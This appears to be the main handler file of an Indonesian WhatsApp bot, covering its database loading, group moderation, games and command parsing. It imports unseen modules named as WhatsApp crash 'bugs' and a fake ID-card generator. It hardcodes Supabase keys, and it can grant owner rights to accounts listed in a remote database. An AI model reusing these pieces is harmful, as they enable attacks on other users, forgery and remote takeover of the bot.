 
require('./settings')
const { isMediaPayload } = require('./plugins/reply_greeting')
const { resolveCardThumb, buildOurinSenderCtx } = require('./plugins/metacard')
const { addWarn } = require('./lib/warnHelper')
require('./lib/listmenu')
const {
    downloadContentFromMessage,
	extractImageThumb
} = require('@whiskeysockets/baileys')
const { modul } = require('./module')
const path = require('path')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Client } = require('ssh2');
let _sewa = require("./lib/store")

const { isAITriggered, isReplyToBot, resolveAIPrompt, runAIInteractive, handleSetRole, handleClearRole, getRoleOf, getEffectiveRole, getRoleByCount, ROLE_LEVELS, ROLE_NAMES, getChatCount, incrementChatCount, setChatCount, formatStatusCard, clearUserHistory, getGlobalLogic, setGlobalLogic, resetGlobalLogic, DEFAULT_LOGIC, setVoiceModel, getVoiceModel, getVoiceList, BELL_VOICES, generateVoice, getDailyInfo, incrementDaily, resetDailyLimit, markLimitMsgShown, DAILY_LIMIT_FREE, isPremiumUser, isFirstChat, getUserHistory, BOT_NICKNAME, BOT_FULLNAME } = require('./machine/interactive_ai');

const groupCtx = require('./machine/group_context');

let ChatAlya1 = JSON.parse(fs.readFileSync('./database/ChatAlya1.json'));
if (global.alyaHistory === undefined) global.alyaHistory = {};



const _salamCategories = {
    salamuser: 'salamuser.json',
    salamowner: 'salamowner.json',
    salamadmin: 'salamadmin.json',
};
for (const [_gKey, _fileName] of Object.entries(_salamCategories)) {
    if (!global[_gKey]) {
        try {
            const _salamPath = require('path').join(process.cwd(), 'database', _fileName);
            global[_gKey] = fs.existsSync(_salamPath) ? (JSON.parse(fs.readFileSync(_salamPath, 'utf-8')) || []) : [];
        } catch { global[_gKey] = []; }
    }
}


if (!global._sewaStore) {
    try {
        const _swPath = require('path').join(process.cwd(), 'database', 'sewastore.json');
        global._sewaStore = fs.existsSync(_swPath) ? (JSON.parse(fs.readFileSync(_swPath, 'utf-8')) || []) : [];
    } catch { global._sewaStore = []; }
}
const { jadibot, stopjadibot, listjadibot } = require('./lib/clone')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { absenList, saveAbsen, resetAbsen } = require('./lib/absen');
const { createClient } = require('@supabase/supabase-js');
const SUPABASE_URL = 'https://uzyzpgujphlmesbmcwca.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InV6eXpwZ3VqcGhsbWVzYm1jd2NhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUwNjQwMjcsImV4cCI6MjA3MDY0MDAyN30.SwjgDAcEDLvjmzKzxHPdtHdjLbH1Zsr20MbPI4s6F94';
const supabase = createClient(global.supaurl, global.supakey);
const SUPABASE_URL1 = 'https://sryzxymkvrtainlnzvok.supabase.co';
const SUPABASE_KEY1 = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNyeXp4eW1rdnJ0YWlubG56dm9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ0NTM0NDgsImV4cCI6MjA5MDAyOTQ0OH0.AUUpzBRqFivyfmD-KP6swqx0Y2qpJJ9kQkvne89-0-Y';
const supabase1 = createClient(SUPABASE_URL1, SUPABASE_KEY1);
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { Primbon } = require('scrape-primbon')
const packageJson = require('./package.json'); 
const primbon = new Primbon()

const scrapeEnkaProfile = require('./scrape/genshinstalk')
const { AplynCallnode } = require('./lib/bugs/callbug');
const { enpezee } = require('./lib/bugs/dellbug');
const { bulldozernew } = require('./lib/bugs/bull');
const { delayinvis } = require('./lib/bugs/bull');
const { ktpgen } = require('./lib/ktpmaker.js');
const RemoveBG = require('./fitur/removebg');
const { fakeXnxx } = require('./scrape/fxnxx')
const { kusonime } = require('./fitur/kusonime')
const { dataHiragana, dataKatakana, dataKanji, dataSoalJepang } = require('./fitur/belajarjepang')
const { dataLPK } = require('./fitur/lpkkerjajepang')

const _kursusJepangPlugins = require('./fitur/belajarjepang_kursus')
const { handleJawaban: _handleJawaban, getUserData: _kursusGetUser, kirimSoal: _kursusSoal, kirimMateri: _kursusMateri } = require('./fitur/belajarjepang_kursus')
const CreateImg = require('./lib/createimg')
const TrueCaller = require('./lib/truecaller')
global.truecallerSession = {}
const nsfwchecker = require('./scrape/nsfw-checker');
const { downloadMediaMessage } = require('@whiskeysockets/baileys')
const antibotPath = './database/antibot.json'
const antibotSettingsPath = './database/antibot-settings.json'
const loadJSON = (path) => {
  try {
    return JSON.parse(fs.readFileSync(path))
  } catch {
    return {}
  }
}

let antibot = loadJSON(antibotPath)
let antibotSettings = loadJSON(antibotSettingsPath)


const saveAntibot = () =>
  debouncedWrite(antibotPath, () => antibot)

const saveAntibotSettings = () =>
  debouncedWrite(antibotSettingsPath, () => antibotSettings)
const photoEdit = require("./lib/chainbreak2");
const { reactChannel } = require('./lib/reactch.js');
const { 
    animeHome,
    animeSchedule,
    animeDetail,
    animeCompleted,
    animeOngoing,
    animeGenreList,
    animeByGenre,
    animeSearch,
    animeEpisode,
    animeBatch
} = require('./scrape/anime');
const cekMember = require('./lib/cekmember');
const { getCleanedJid } = require('./lib/getCleanedJid')
const { resolveWid } = require('./lib/jid')
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');





const registeredFile = './database/registered.json';
let registeredUsers = fs.existsSync(registeredFile) ? JSON.parse(fs.readFileSync(registeredFile)) : [];
const { color, bgcolor } = require('./lib/color')
const { TelegraPh, UploadFileUgu } = require('./lib/uploader')
const geminikey = global.aiso[Math.floor(Math.random() * global.aiso.length)]
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const fg = require('api-dylux')
const { addSewaGroup, checkSewaGroup, getSewaPosition, toMs, msToDate, getGcName, remindSewa } = require('./lib/sewa');
const { matchPrefix, getPrefixes, getPrefixDisplay } = require('./lib/prefix');
const { ttsHololive, hololiveModels } = require('./scrape/holotts');
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const playchHandler = require("./lib/playch.js");
const playCh2 = require("./lib/playch2")
const { uploadUguu, createEKTP } = require('./lib/ektp.js');
const ptvHandler = require("./lib/ptv");
const reactChannelHandler = require("./lib/reactchannel");
const fakeTwitHandler = require("./lib/faketwit");
const antidelete = require('./lib/antidelete')
let messagesBackup = antidelete.messagesBackup

const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const cron = require('node-cron')
const mediafire = require('./scrape/mediafire');
const scp3 = require('./scrape/scraperrr')
const similarity = require("similarity");
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const { lirik } = require('./scrape/lirik')
const didyoumean = require("didyoumean");
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const { videoenhancer } = require('./fitur/hdvid')
const { hdr } = require('./scrape/iloveimg.js')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()





function getOwnerList() {
    const _now = Date.now();
    if (!global._ownerCache || (_now - global._ownerCache.ts) > 3000) {
        try {
            global._ownerCache = {
                data: JSON.parse(fs.readFileSync('./database/owner.json', 'utf8')),
                ts: _now
            };
        } catch {
            global._ownerCache = { data: global._ownerCache?.data || [], ts: _now };
        }
    }
    return global._ownerCache.data;
}



const owner = new Proxy([], {
    get(_target, prop) { return getOwnerList()[prop]; },
    has(_target, prop) { return prop in getOwnerList(); }
});
const owned = `6283166570663@s.whatsapp.net`
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))

Object.defineProperty(global, 'owner', { get: getOwnerList, configurable: true });
global.prem = prem








global.fetchJson       = fetchJson
global.axios           = axios
global.primbon         = primbon
global.UploadFileUgu   = UploadFileUgu
global.sleep           = sleep
global.isUrl           = isUrl
global.fs              = fs
global.moment          = moment
global.proto           = proto

global.getBuffer       = getBuffer
global.getRandom       = getRandom
global.tanggal         = tanggal
global.clockString     = clockString
global.formatp         = formatp
global.jsonformat      = jsonformat
global.runtime         = runtime
global.reSize          = reSize
global.parseMention    = parseMention
global.getTime         = getTime
global.generateProfilePicture = generateProfilePicture

global.TelegraPh       = TelegraPh

global.fg              = fg

global.cheerio         = cheerio

const badPath = './database/bad.json';
const antiToxicPath = './database/antitoxic.json'
const resellerp = JSON.parse(fs.readFileSync('./database/resellerpanel.json'))
const adminp = JSON.parse(fs.readFileSync('./database/adminpanel.json'))
const alys = JSON.parse(fs.readFileSync('./database/alys.json'))
const alyas = JSON.parse(fs.readFileSync('./database/alyas.json'))
const ptp = JSON.parse(fs.readFileSync('./database/ptpanel.json'))
const ownp = JSON.parse(fs.readFileSync('./database/ownerpanel.json'))
const alyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const dbGroupsFile = path.join('./database/antinsfw.json');
const dbWarnFile = path.join('./database/antinsfw-warn.json');
const autosahurFile = './database/autosahur.json'
if (!fs.existsSync(autosahurFile)) {
    fs.writeFileSync(autosahurFile, '{}')
}
let antiNSFWGroups = [];
if (fs.existsSync(dbGroupsFile)) {
    antiNSFWGroups = JSON.parse(fs.readFileSync(dbGroupsFile));
} else {
    fs.writeFileSync(dbGroupsFile, JSON.stringify([]));
}
let nsfwWarnings = {};
if (fs.existsSync(dbWarnFile)) {
    nsfwWarnings = JSON.parse(fs.readFileSync(dbWarnFile));
} else {
    fs.writeFileSync(dbWarnFile, JSON.stringify({}));
}
const dbSpamGroups = './database/antispam-groups.json'
const dbSpamWarn = './database/antispam-warn.json'
let antiSpamGroups = fs.existsSync(dbSpamGroups)
    ? JSON.parse(fs.readFileSync(dbSpamGroups))
    : (fs.writeFileSync(dbSpamGroups, JSON.stringify([])), [])

let spamWarnings = fs.existsSync(dbSpamWarn)
    ? JSON.parse(fs.readFileSync(dbSpamWarn))
    : (fs.writeFileSync(dbSpamWarn, JSON.stringify({})), {})
const dbSpamCounter = './database/antispam-counter.json'

let spamData = fs.existsSync(dbSpamCounter)
    ? JSON.parse(fs.readFileSync(dbSpamCounter))
    : (fs.writeFileSync(dbSpamCounter, JSON.stringify({})), {})


const dbWarnSystem = './database/warn-system.json'
let warnSystem = fs.existsSync(dbWarnSystem)
    ? JSON.parse(fs.readFileSync(dbWarnSystem))
    : (fs.writeFileSync(dbWarnSystem, JSON.stringify({})), {})

const AlyaVoiceNote = JSON.parse(fs.readFileSync('./data/AlyaMedia/database/xeonvn.json'))
const AlyaSticker = JSON.parse(fs.readFileSync('./data/AlyaMedia/database/xeonsticker.json'))
const ImageAlya = JSON.parse(fs.readFileSync('./data/AlyaMedia/database/xeonimage.json'))
const VideoAlya = JSON.parse(fs.readFileSync('./data/AlyaMedia/database/xeonvideo.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())





let siminya = (() => {
  try {
    if (!fs.existsSync('./database/simi.json'))
      fs.writeFileSync('./database/simi.json', '[]')
    return JSON.parse(fs.readFileSync('./database/simi.json', 'utf-8')) || []
  } catch { return [] }
})()
global.siminya = siminya
const ChatAlya = JSON.parse(fs.readFileSync('./database/ChatAlya.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const versiSc = packageJson.version;
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
let whitelist = JSON.parse(fs.readFileSync('./database/whitelist.json'))
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let antilinkgc2 = fs.existsSync('./database/antilinkgc2.json')
  ? JSON.parse(fs.readFileSync('./database/antilinkgc2.json'))
  : {}
let antilinkgc2_db = fs.existsSync('./database/antilinkgc2-db.json')
  ? JSON.parse(fs.readFileSync('./database/antilinkgc2-db.json'))
  : {}
let ntlinkch =JSON.parse(fs.readFileSync('./database/antilinkch.json'))
let warnlinkch = JSON.parse(fs.readFileSync('./database/antilinkch-warning.json'));
let userWarnings = {};
let badwords = [];
let nttoxic = []
if (fs.existsSync(antiToxicPath)) {
    nttoxic = JSON.parse(fs.readFileSync(antiToxicPath))
} else {
    fs.writeFileSync(antiToxicPath, JSON.stringify([]))
    nttoxic = []
}
if (fs.existsSync(badPath)) {
    badwords = JSON.parse(fs.readFileSync(badPath));
} else {
    fs.writeFileSync(badPath, JSON.stringify([], null, 2));
    badwords = [];
}
let antiToxic = {};
if (fs.existsSync(antiToxicPath)) {
    antiToxic = JSON.parse(fs.readFileSync(antiToxicPath));
} else {
    fs.writeFileSync(antiToxicPath, JSON.stringify({}, null, 2));
}
function saveBadwords() {
    fs.writeFileSync(badPath, JSON.stringify(badwords, null, 2));
}
  function priceTick(type){
    const now=Date.now()

    if (!db.marketPrice[type]){
      db.marketPrice[type]={
        price:100+Math.random()*20,
        last:now-60000,
        lastNPC:now-60000
      }
    }

    let p=db.marketPrice[type]

     
    if (now-p.lastNPC>=60000){
      npcTrade()
      p.lastNPC=now
    }

    let [min,max]=baseMove[trend]
    min*=markets[type].vol
    max*=markets[type].vol

    let elapsed=Math.max(1,Math.floor((now-p.last)/60000))
    let move=(Math.random()*(max-min)+min)*elapsed

     
    move+=db.market.npc*0.15

    p.price=Math.max(10,p.price+move)
    p.last=now

     
    db.market.npc*=0.85

    return p.price
  }
   
  function npcTrade() {
  if (!global.db || !db.market) return 'HOLD'
  const chance = {
    BULL: { buy: 0.6, sell: 0.2 },
    SIDEWAYS: { buy: 0.35, sell: 0.35 },
    BEAR: { buy: 0.2, sell: 0.6 },
    CRASH: { buy: 0.1, sell: 0.75 }
  }[db.market.trend]

  let r = Math.random()
  if (r < chance.buy) {
    db.market.npc += Math.random() * 2
    return 'BUY'
  }
  if (r < chance.buy + chance.sell) {
    db.market.npc -= Math.random() * 2.5
    return 'SELL'
  }
  return 'HOLD'
}

function saveAntiToxic() {
    debouncedWrite(antiToxicPath, () => nttoxic, 3000); 
}
function saveNtToxic() {
    debouncedWrite(antiToxicPath, () => nttoxic, 3000); 
}
function gayaHalah(text) {
    if (/cangratalataans|laval|rala|raward|samakan|sarang|barantaraksa|nashakaga chasata/i.test(text)) {
        return null;
    }
    return text
        .replace(/[aeou]/gi, 'a')
        .replace(/congratulations/gi, 'cangratalataans')
        .replace(/you/gi, 'yaa')
        .replace(/level/gi, 'laval')
        .replace(/role/gi, 'rala')
        .replace(/reward/gi, 'raward')
        .replace(/semakin/gi, 'samakan')
        .replace(/sering/gi, 'sarang')
        .replace(/berinteraksi/gi, 'barantaraksa')
        .replace(/dengan/gi, 'dangan')
        .replace(/nishikigi chisato/gi, 'nashakaga chasata')
        .replace(/money/gi, 'manay')
}

function generatePin() {
    return Math.floor(1000 + Math.random() * 9000).toString();
}

function gayaHilih(text) {
    if (/cingritilitiins|livil|rili|riwird|simikin|siring|birintiriksi|nishikigi chisiti/i.test(text)) {
        return null;
    }
    return text
        .replace(/[aeou]/gi, 'i')
        .replace(/congratulations/gi, 'cingritilitiins')
        .replace(/you/gi, 'yii')
        .replace(/level/gi, 'livil')
        .replace(/role/gi, 'rili')
        .replace(/reward/gi, 'riwird')
        .replace(/semakin/gi, 'simikin')
        .replace(/sering/gi, 'siring')
        .replace(/berinteraksi/gi, 'birintiriksi')
        .replace(/dengan/gi, 'dingin')
        .replace(/nishikigi chisato/gi, 'nishikigi chisiti')
        .replace(/money/gi, 'miniy')
}


function saveWhitelist() {
    debouncedWrite('./database/whitelist.json', () => whitelist)
}

function saveIdgrup() {
    debouncedWrite('./database/idgrup.json', () => pler)
}

function saveWarnLinkCh() {
    debouncedWrite('./database/antilinkch-warning.json', () => warnlinkch)
}
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json')) 
let antitagsw = JSON.parse(fs.readFileSync('./database/antitagsw.json'))
let warnTagSw = JSON.parse(fs.readFileSync('./database/antitagsw-warning.json'))


function saveAntitagWarning() {
    debouncedWrite('./database/antitagsw-warning.json', () => warnTagSw)
}





let openaigc = (() => {
  try {
    if (!fs.existsSync('./database/openaigc.json'))
      fs.writeFileSync('./database/openaigc.json', '[]')
    return JSON.parse(fs.readFileSync('./database/openaigc.json', 'utf-8')) || []
  } catch { return [] }
})()
global.openaigc = openaigc


let alisagc = (() => {
  try {
    if (!fs.existsSync('./database/alisa_gc.json'))
      fs.writeFileSync('./database/alisa_gc.json', '[]')
    return JSON.parse(fs.readFileSync('./database/alisa_gc.json'))
  } catch { return [] }
})()
global.alisagc = alisagc

;(() => {
  try {
    const _alisaStatusPath = './database/alisa_status.json'
    if (fs.existsSync(_alisaStatusPath)) {
      const _st = JSON.parse(fs.readFileSync(_alisaStatusPath, 'utf-8'))
      global.alisaDisabled = _st.disabled === true
    } else {
      global.alisaDisabled = false
    }
    console.log('[Alisa KillSwitch] Loaded, disabled =', global.alisaDisabled)
  } catch (e) {
    global.alisaDisabled = false
    console.error('[Alisa KillSwitch] Load error:', e.message)
  }
})()
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))

fs.watchFile('./database/welcome.json', () => { try { _welcome = JSON.parse(fs.readFileSync('./database/welcome.json')); } catch(_){} });
fs.watchFile('./database/left.json', () => { try { _left = JSON.parse(fs.readFileSync('./database/left.json')); } catch(_){} });
fs.watchFile('./database/set_welcome.json', () => { try { set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json')); } catch(_){} });
fs.watchFile('./database/set_left.json', () => { try { set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json')); } catch(_){} });
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let autoCloseDB = JSON.parse(fs.readFileSync('./database/autoco.json'));
let autoCloseLastAction = {}; 

function saveAutoClose() {
    debouncedWrite('./database/autoco.json', () => autoCloseDB)
}
const DB_FILE = './database/database.json';
function loadDB() {
  if (fs.existsSync(DB_FILE)) {
    try {
      const raw = fs.readFileSync(DB_FILE);
      return JSON.parse(raw);
    } catch (err) {
      console.error('Error reading DB file:', err);
      return { chats: {} };
    }
  } else {
    return { chats: {} };
  }
}
const { markDirty: _markDirty, flushDB: _flushDB } = require('./lib/dbwriter');
const { debouncedWrite, flushAllDebounced } = require('./lib/debouncewriter');

function saveDB(db) {
  
  
  
  _markDirty();
}
global.db = loadDB();
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}














{
  const _proxyCache = new WeakMap();
  const _wrap = (obj) => {
    if (obj === null || typeof obj !== 'object') return obj;
    if (_proxyCache.has(obj)) return _proxyCache.get(obj);
    const proxy = new Proxy(obj, {
      get(target, prop, receiver) {
        const val = Reflect.get(target, prop, receiver);
        
        if (val !== null && typeof val === 'object' && !(val instanceof Buffer)) {
          return _wrap(val);
        }
        return val;
      },
      set(target, prop, value, receiver) {
        const ok = Reflect.set(target, prop, value, receiver);
        _markDirty();
        return ok;
      },
      deleteProperty(target, prop) {
        const ok = Reflect.deleteProperty(target, prop);
        _markDirty();
        return ok;
      },
    });
    _proxyCache.set(obj, proxy);
    return proxy;
  };
  for (const _k of ['users', 'chats', 'settings', 'game', 'others', 'database', 'sticker']) {
    if (global.db[_k] && typeof global.db[_k] === 'object') {
      global.db[_k] = _wrap(global.db[_k]);
    }
  }
}


let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []
let tebakanml = {}
global.tebakanml = tebakanml

global.dataSoalJepang = dataSoalJepang
global.dataHiragana = dataHiragana
global.dataKatakana = dataKatakana
global.dataKanji = dataKanji
let autosahurData = JSON.parse(fs.readFileSync(autosahurFile, 'utf-8'))

let sahurCronStarted = false

function startAutoSahur(alya) {
    if (sahurCronStarted) return
    sahurCronStarted = true

    nodecron.schedule('0 0 3 * * *', async () => {
        try {
            let groups = Object.keys(autosahurData)

            if (groups.length === 0) return

            for (let groupId of groups) {
                    await alya.sendMessage(groupId, {
    audio: { 
        url: 'https://c.termai.cc/a103/Rk9YWBB.mp3' 
    },
    mimetype: 'audio/mpeg',
    ptt: true,
    contextInfo: {}
}).catch(_ => _);
                    await new Promise(resolve => setTimeout(resolve, 2000));
			}
        } catch (err) {
            console.log('Auto Sahur Error:', err)
        }
    }, {
        scheduled: true,
        timezone: "Asia/Jakarta"
    })
}


let _autoSahurAlya = null;
function initAutoSahur(alya) {
    if (!_autoSahurAlya) {
        _autoSahurAlya = alya;
        startAutoSahur(alya);
    }
}

module.exports = alya = async (alya, m, chatUpdate, store) => {
    initAutoSahur(alya);

    if (!db.data) db.data = {}
    if (!db.data.chats) db.data.chats = {}

    let chat = db.data.chats[m.chat] || (db.data.chats[m.chat] = {})

    if (!chat.antipromosi) {
        chat.antipromosi = {
            status: false,
            count: {}
        }
    }
try {
  
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const bodyRaw = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '';
        const body = typeof bodyRaw === 'string' ? bodyRaw : '';
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ' '

let budy = m.message.conversation || (m.message.extendedTextMessage && m.message.extendedTextMessage.text) || ''








const matchedPrefix = matchPrefix(body)
const activePrefixes = getPrefixes()
const prefix = matchedPrefix || activePrefixes[0] || '.'



function isAnyPrefix(str) {
  if (typeof str !== 'string' || !str) return false
  return activePrefixes.some((p) => str.startsWith(p))
}
const isSewa = checkSewaGroup(m.chat, sewa)
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: alya.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, alya.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
alya.ev.emit('messages.upsert', msg)
}
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ' '
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        
        
        
        
        const isCmd = matchedPrefix !== null
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = isCmd
          ? body.slice(matchedPrefix.length).trim().split(/ +/).shift().toLowerCase()
          : body.trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        
        
        
        
        
        
        
        
        
        
        
        if (isCmd) console.log(`[CMD] ${matchedPrefix}${command} dari ${(m.sender || '').split('@')[0]} (${m.isGroup ? 'grup' : 'pribadi'})`)
        if (global.DEBUG_DIAG) console.log('[DIAG-ENTRY] alya.js menerima pesan. chat=', m.chat, 'sender=', m.sender, 'body=', JSON.stringify(body), 'isCmd=', isCmd, 'command=', command)
        
        
        const pushname = m.pushName || "Alya User"
        const botNumber = alya.decodeJid(alya.user.id)  
        let Ryuu = owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        
        
        
        
        
        if (!Ryuu && global.allowRemoteOwners === true) {
            if (global._supaOwnerCache === undefined) global._supaOwnerCache = new Set();
            if (global._supaOwnerCache.has(m.sender)) {
                Ryuu = true;
            } else if (!global._supaOwnerCacheLoaded) {
                try {
                    const { data: allOwners } = await supabase1.from('owners').select('jid');
                    if (allOwners) allOwners.forEach(o => global._supaOwnerCache.add(o.jid));
                    global._supaOwnerCacheLoaded = true;
                    if (global._supaOwnerCache.has(m.sender)) Ryuu = true;
                } catch (e) {   }
            }
        }
        const text = q = args.join(" ")
        
        const cleanArgs = args.map(a => a.replace(/^@/, ''))
        const cleanQ = q.replace(/^@/, '').replace(/@(\d+)/g, '$1')
        const quoted = m.quoted ? m.quoted : (require('./lib/rvo-extract').fallbackQuoted?.(m) || m)
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
